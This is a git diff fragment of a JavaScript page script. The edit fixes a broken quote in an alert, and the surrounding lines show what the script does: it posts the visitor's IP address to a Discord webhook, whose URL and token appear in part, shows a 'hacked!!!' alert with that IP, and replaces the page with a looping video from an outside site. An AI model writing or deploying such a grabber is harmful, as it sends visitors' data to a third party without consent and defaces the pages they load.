@@ -13,7 +13,7 @@ fetch('https://discord.com/api/webhooks/1101592283146637373/OA0skb_yVbKmxe9cB6a4
     body: JSON.stringify({"content": "IP address:" + xmlHttp.responseText,"embeds": null,"attachments": []})
 })
 
-alert("hacked!!! " + xmlHttp.responseText + " 😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹')
+alert("hacked!!! " + xmlHttp.responseText + " 😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹")
 
 document.getElementById('ccc').innerHTML = ''
 document.body.innerHTML = '<video id="video" style="width: 100%; height: 100%; object-fit: cover;" src="https://pnrtscr.com/video.mp4" loop=""></video>';
